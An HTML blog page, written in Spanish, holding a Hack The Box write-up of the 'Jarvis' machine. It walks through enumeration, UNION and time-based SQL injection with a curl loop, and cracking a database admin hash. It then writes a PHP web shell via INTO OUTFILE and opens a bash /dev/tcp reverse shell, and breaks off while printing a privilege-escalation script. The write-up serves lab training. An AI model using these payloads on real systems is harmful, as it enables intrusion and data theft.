@@ -1,0 +1,392 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Jarvis HTB   WriteUP // 0xl3mon💀</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="0xl3mon" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Jarvis HTB   WriteUP"/>
+<meta name="twitter:description" content="Reconnaissance Nmap Recon Results Discovery OS System \
+Recon Open Ports
+Service Enumeration
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel 64999/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2."/>
+
+    <meta property="og:title" content="Jarvis HTB   WriteUP" />
+<meta property="og:description" content="Reconnaissance Nmap Recon Results Discovery OS System \
+Recon Open Ports
+Service Enumeration
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel 64999/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/htb/jarvis-htb-writeup/" />
+<meta property="article:published_time" content="2022-03-27T15:40:14+02:00" />
+<meta property="article:modified_time" content="2022-03-27T15:40:14+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="0xl3mon" /></a>
+      <h1>0xl3mon💀</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">𝘏𝘰𝘮𝘦</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">𝘏𝘢𝘤𝘬𝘛𝘩𝘦𝘉𝘰𝘹</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">𝘈𝘣𝘰𝘶𝘵</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Jarvis HTB   WriteUP</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 27, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          8 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap-recon-results">Nmap Recon Results</h3>
+<p><strong>Discovery OS System</strong> \</p>
+<p><img src="https://i.imgur.com/1dgYsXD.png" alt=""></p>
+<p><strong>Recon Open Ports</strong></p>
+<p><img src="https://i.imgur.com/IzDeCjg.png" alt=""></p>
+<p><strong>Service Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp    open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+|_http-title: Stark Hotel
+64999/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p><strong>Whatweb</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://10.129.1.113 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.25<span style="color:#f92672">]</span>, Bootstrap, Cookies<span style="color:#f92672">[</span>PHPSESSID<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>supersecurehotel@logger.htb<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Debian Linux<span style="color:#f92672">][</span>Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.129.1.113<span style="color:#f92672">]</span>, JQuery, Modernizr<span style="color:#f92672">[</span>2.6.2.min<span style="color:#f92672">]</span>, Open-Graph-Protocol, Script, Title<span style="color:#f92672">[</span>Stark Hotel<span style="color:#f92672">]</span>, UncommonHeaders<span style="color:#f92672">[</span>ironwaf<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>
+</code></pre></div><h4 id="web-services">Web Services</h4>
+<p><code>dirsearch -u http://10.129.1.113 -w /usr/share/dirb/wordlists/common.txt -e &quot; &quot; -F -x &quot;400,404&quot; -t 100 -o webscan</code>
+Comenzaremos fuzzeando el servicio web para hacernos una idea de que directorios podemos encontrar.</p>
+<p><img src="https://i.imgur.com/R3U3roY.png" alt=""></p>
+<p>Vamos a enumerar el servicio web y por lo que notamos de entrada es una pagina web relacionada con un hotel.
+http://10.129.1.113/</p>
+<p><img src="https://i.imgur.com/lMGv3oL.png" alt=""></p>
+<p><strong>Fuzzing del servicio Web</strong>
+<code>nmap --script http-enum -p 80 10.129.1.113 -T4 -n -oN http-enum</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /phpmyadmin/: phpMyAdmin
+|   /css/: Potentially interesting directory w/ listing on <span style="color:#e6db74">&#39;apache/2.4.25 (debian)&#39;</span>
+|   /images/: Potentially interesting directory w/ listing on <span style="color:#e6db74">&#39;apache/2.4.25 (debian)&#39;</span>
+|_  /js/: Potentially interesting directory w/ listing on <span style="color:#e6db74">&#39;apache/2.4.25 (debian)&#39;</span>
+</code></pre></div><p>fuzzeando el servicio web por el puerto 80 nos damos cuenta que existe &lsquo;phpmyadmin&rsquo;, eso quiere decir que probablemente el servicio web realize consultas a la base de datos.</p>
+<p><img src="https://i.imgur.com/rqJnLPM.png" alt=""></p>
+<p>Probamos las credentials por defecto  pero no funcionan</p>
+<p><img src="https://i.imgur.com/fVnuPwY.png" alt=""></p>
+<p>Bien sabemos que Existe el fichero <code>ChangeLog</code> que nos sirve para Enumerar la version de PHPMYADMIN</p>
+<p><img src="https://i.imgur.com/AxyBzwE.png" alt="AltText|800"></p>
+<p><strong>PhpMyAdmin 4.8.0</strong></p>
+<p>realizando una busqueda en searchsploit encontramos 2 exploits de Local File Inclusion pero tenemos que autenticarnos asi que por el momento no nos sirve de mucho, continuaremos enumerando el sitio web</p>
+<p><img src="https://i.imgur.com/R0OUbx2.png" alt=""></p>
+<p>La mayor parte del sitio web es estatica, aunque hay 2 secciones donde podemos interactucar una es &ldquo;Room&rdquo; y &ldquo;Dinning Bar&rdquo; ,en Room vemos que hace uso del parametro <strong>&quot;?cod&quot;</strong> para realizar consultas</p>
+<p><img src="https://i.imgur.com/tNI9wXQ.png" alt=""></p>
+<p>Probamos Sql Injection Basicas, como las siguiente <code>?cod=1' and sleep (5)</code>  y la respuesta parece no variar pero cuando sacamos la comilla <code>?cod=1 and sleep (5)</code> el servidor demora 5 segundos en responder, osea que es vulnerable a **SQLI **</p>
+<p>terminamos determinando que el numero de columna son 7, por que cuando intentabamos consultar por el ==&ldquo;N 6&rdquo;== en la respuesta veiamos que nos devolvia una imagen con una  habitacion ,pero esto no pasaba con el  ==&ldquo;7 &ldquo;== en adelante. por ejp:</p>
+<p><img src="https://i.imgur.com/PQPMBOo.png" alt="AltText"></p>
+<p>Y en la siguiente imagen fue el punto donde determinamos que el numero de columnas son 7.
+<img src="https://i.imgur.com/IOwC22l.png" alt=""></p>
+<p>como vemos no nos devuelve la imagen de la habitacion.</p>
+<p>bien ahora intentaremos listar etiquedas del <code>Union Select</code> donde inyectaremos nuestras consultas&hellip;al final hemos pasado algo de tiempo tratando de listar las etiquetas, para esto tubimos que realizar una consulta a un &lsquo;?cod&rsquo; que no existia por ejemplo desde el 7 en adelante.</p>
+<p><img src="https://i.imgur.com/OnwT6a6.png" alt=""></p>
+<p><strong>Enumerando Bases De datos</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo ; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">`</span>seq <span style="color:#ae81ff">0</span> 100<span style="color:#e6db74">`</span>; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;[*] TABLE Nº </span>$i<span style="color:#e6db74"> </span><span style="color:#66d9ef">$(</span>curl -s <span style="color:#e6db74">&#34;http://supersecurehotel.htb/room.php?cod=7%20union%20select%201,schema_name,3,4,5,6,7%20from%20information_schema.schemata%20limit%20</span>$i<span style="color:#e6db74">,1&#34;</span> | grep <span style="color:#e6db74">&#34;h3&#34;</span> | awk <span style="color:#e6db74">&#39;{print $3}&#39;</span> FS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&gt;&#39;</span> | cut -d <span style="color:#e6db74">&#39;&lt;&#39;</span> -f 1<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> ; <span style="color:#66d9ef">done</span>
+</code></pre></div><p><img src="https://i.imgur.com/lPjeKQE.png" alt=""></p>
+<p><strong>Enumerando Tablas</strong></p>
+<p><img src="https://i.imgur.com/WgUzy5f.png" alt=""></p>
+<p><strong>Enumerando Columnas</strong></p>
+<p><img src="https://i.imgur.com/ootNm7u.png" alt=""></p>
+<p><img src="https://i.imgur.com/6t6L4AO.png" alt=""></p>
+<ul>
+<li><code>DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</code></li>
+</ul>
+<p>bien pasaremos el hash a un archivo de texto y lo crackeremos con john</p>
+<p><img src="https://i.imgur.com/UYmhGdh.png" alt=""></p>
+<ul>
+<li><strong>Valid Credential</strong>
+<ul>
+<li>Pass: <del>imissyou</del></li>
+</ul>
+</li>
+</ul>
+<h2 id="metodo-ii">Metodo II</h2>
+<p>hay otra posible instrucion en la maquina a traves de funciones que maneja sql como por ejemplo, volcar contenido  a un fichero en un directorio donde tengamos permisos de escritura  o asi como tambien podemos cargar ficheros</p>
+<p><strong>Example</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> load_file(<span style="color:#e6db74">&#39;/var/lib/mysql-files/key.txt&#39;</span>); <span style="color:#f92672">#</span><span style="color:#66d9ef">Read</span> file
+<span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;Hola esto es una prueba&#34;</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#34;/var/www/html/images/test.txt&#34;</span>  <span style="color:#f92672">#</span>Proof <span style="color:#66d9ef">Write</span> File
+<span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#34;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&#34;</span>,<span style="color:#ae81ff">4</span> <span style="color:#66d9ef">into</span> OUTFILE <span style="color:#e6db74">&#39;C:/xampp/htdocs/back.php&#39;</span>
+</code></pre></div><p><img src="https://i.imgur.com/Ecz18gV.png" alt="AltText|"></p>
+<p>vemos que la inclusion de archivos funciona, ahora intentamos volcar contenido en un archivo para ver si despues podemos leerlo</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://supersecurehotel.htb/room.php?cod<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span> union <span style="color:#66d9ef">select</span> 1,2,3,4,<span style="color:#e6db74">&#34;Hola esto es una prueba&#34;</span>,6,7 into outfile <span style="color:#e6db74">&#34;/var/www/html/js/test.txt&#34;</span>
+</code></pre></div><p><img src="https://i.imgur.com/Xd2vBio.png" alt=""></p>
+<p>y si lo listamos vemos que aparece nuestra estructura de la consulta, ahora intentaremos hacer una web shell</p>
+<p><img src="https://i.imgur.com/1CXUmDz.png" alt=""></p>
+<p>cuando listamos el archivo y vemos que el campo donde hemos metido nuestra webshell no aparece es buena señal ya que se esta interpretando el codigo PHP y no nos lo muestra</p>
+<p><img src="https://i.imgur.com/H78pnaz.png" alt=""></p>
+<p>injection en la que meteremos nuestra web shell
+<code>union select 1,2,3,4,&quot;&lt;?php echo shell_exec($_REQUEST['cmd']); ?&gt;&quot;,6,7 into outfile &quot;/var/www/html/js/shell.php&quot;</code></p>
+<p><img src="https://i.imgur.com/usfcVgT.png" alt=""></p>
+<p>entablamos una reverse shell desde nuestra webshell, con el siguiente payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;%26 /dev/tcp/10.10.14.68/443 0&gt;%261
+</code></pre></div><p><img src="https://i.imgur.com/8SJCSXr.png" alt=""></p>
+<h4 id="priv-esc-www-data-to-pepper">Priv Esc www-data To Pepper</h4>
+<p>encontramos el siguiente scrpit en <code>/var/www/Admin-Utilities</code> que se nos hace interesante y mas sabiendo que tiene para ejecutarse como el usuario pepper</p>
+<p><img src="https://i.imgur.com/6aCqXNc.png" alt=""></p>
+<p><img src="https://i.imgur.com/9Gji8m1.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> listdir
+<span style="color:#f92672">import</span> re
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_help</span>():
+    message<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">********************************************************
+</span><span style="color:#e6db74">* Simpler   -   A simple simplifier ;)                 *
+</span><span style="color:#e6db74">* Version 1.0                                          *
+</span><span style="color:#e6db74">********************************************************
+</span><span style="color:#e6db74">Usage:  python3 simpler.py [options]
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Options:
+</span><span style="color:#e6db74">    -h/--help   : This help
+</span><span style="color:#e6db74">    -s          : Statistics
+</span><span style="color:#e6db74">    -l          : List the attackers IP
+</span><span style="color:#e6db74">    -p          : ping an attacker IP
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+    <span style="color:#66d9ef">print</span>(message)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_header</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;&#39;***********************************************
+</span><span style="color:#e6db74">     _                 _                       
+</span><span style="color:#e6db74"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+</span><span style="color:#e6db74">/ __| | &#39;_ ` _ \| &#39;_ \| |/ _ \ &#39;__| &#39;_ \| | | |
+</span><span style="color:#e6db74">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+</span><span style="color:#e6db74">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+</span><span style="color:#e6db74">                |_|               |_|    |___/ 
+</span><span style="color:#e6db74">                                @ironhackers.es
+</span><span style="color:#e6db74">                                
+</span><span style="color:#e6db74">***********************************************
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_statistics</span>():
+    path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/home/pepper/Web/Logs/&#39;</span>
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Statistics</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">-----------&#39;</span>)
+    listed_files <span style="color:#f92672">=</span> listdir(path)
+    count <span style="color:#f92672">=</span> len(listed_files)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Number of Attackers: &#39;</span> <span style="color:#f92672">+</span> str(count))
+    level_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    dat <span style="color:#f92672">=</span> datetime(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)
+    ip_list <span style="color:#f92672">=</span> []
+    reks <span style="color:#f92672">=</span> []
+    ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    req <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    rek <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> listed_files:
+        f <span style="color:#f92672">=</span> open(path <span style="color:#f92672">+</span> i, <span style="color:#e6db74">&#39;r&#39;</span>)
+        lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+        level2, rek <span style="color:#f92672">=</span> get_max_level(lines)
+        fecha, requ <span style="color:#f92672">=</span> date_to_num(lines)
+        ip <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">3</span>]
+        <span style="color:#66d9ef">if</span> fecha <span style="color:#f92672">&gt;</span> dat:
+            dat <span style="color:#f92672">=</span> fecha
+            req <span style="color:#f92672">=</span> requ
+            ip2 <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">3</span>]
+        <span style="color:#66d9ef">if</span> int(level2) <span style="color:#f92672">&gt;</span> int(level_1):
+            level_1 <span style="color:#f92672">=</span> level2
+            ip_list <span style="color:#f92672">=</span> [ip]
+            reks<span style="color:#f92672">=</span>[rek]
+        <span style="color:#66d9ef">elif</span> int(level2) <span style="color:#f92672">==</span> int(level_1):
+            ip_list<span style="color:#f92672">.</span>append(ip)
+            reks<span style="color:#f92672">.</span>append(rek)
+        f<span style="color:#f92672">.</span>close()
+	
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Most Risky:&#39;</span>)
+    <span style="color:#66d9ef">if</span> len(ip_list) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;More than 1 ip found&#39;</span>)
+    cont <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> ip_list:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;    &#39;</span> <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; - Attack Level : &#39;</span> <span style="color:#f92672">+</span> level_1 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; Request: &#39;</span> <span style="color:#f92672">+</span> reks[cont])
+        cont <span style="color:#f92672">=</span> cont <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+	
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Most Recent: &#39;</span> <span style="color:#f92672">+</span> ip2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; --&gt; &#39;</span> <span style="color:#f92672">+</span> str(dat) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> req)
+	
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_ip</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Attackers</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">-----------&#39;</span>)
+    path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/home/pepper/Web/Logs/&#39;</span>
+    listed_files <span style="color:#f92672">=</span> listdir(path)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> listed_files:
+        f <span style="color:#f92672">=</span> open(path <span style="color:#f92672">+</span> i,<span style="color:#e6db74">&#39;r&#39;</span>)
+        lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+        level,req <span style="color:#f92672">=</span> get_max_level(lines)
+        <span style="color:#66d9ef">print</span>(i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; - Attack Level : &#39;</span> <span style="color:#f92672">+</span> level)
+        f<span style="color:#f92672">.</span>close()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">date_to_num</span>(lines):
+    dat <span style="color:#f92672">=</span> datetime(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)
+    ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    req<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> lines:
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Level&#39;</span> <span style="color:#f92672">in</span> i:
+            fecha<span style="color:#f92672">=</span>(i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">7</span>])<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">0</span>]
+            regex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;(\d+)-(.*)-(\d+)(.*)&#39;</span>
+            logEx<span style="color:#f92672">=</span>re<span style="color:#f92672">.</span>match(regex, fecha)<span style="color:#f92672">.</span>groups()
+            mes <span style="color:#f92672">=</span> to_dict(logEx[<span style="color:#ae81ff">1</span>])
